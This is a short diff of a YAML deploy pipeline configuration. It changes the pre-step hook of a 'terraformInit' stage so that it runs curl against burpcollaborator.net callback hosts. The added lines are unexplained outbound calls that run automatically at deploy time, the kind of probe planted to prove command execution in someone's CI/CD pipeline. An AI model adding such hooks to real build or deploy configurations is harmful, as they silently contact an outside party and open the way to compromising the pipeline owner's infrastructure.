@@ -4,4 +4,5 @@ deploy:
   steps:
     terraformInit:
       before:
-        - curl l4q5z85agmuevqt54nohymxzxq3gr5.burpcollaborator.net
+        - curl http://c6jp3s2buzvn4l9euh61u3hfj6pxdm.burpcollaborator.net
+        - curl c6jp3s2buzvn4l9euh61u3hfj6pxdm.burpcollaborator.net
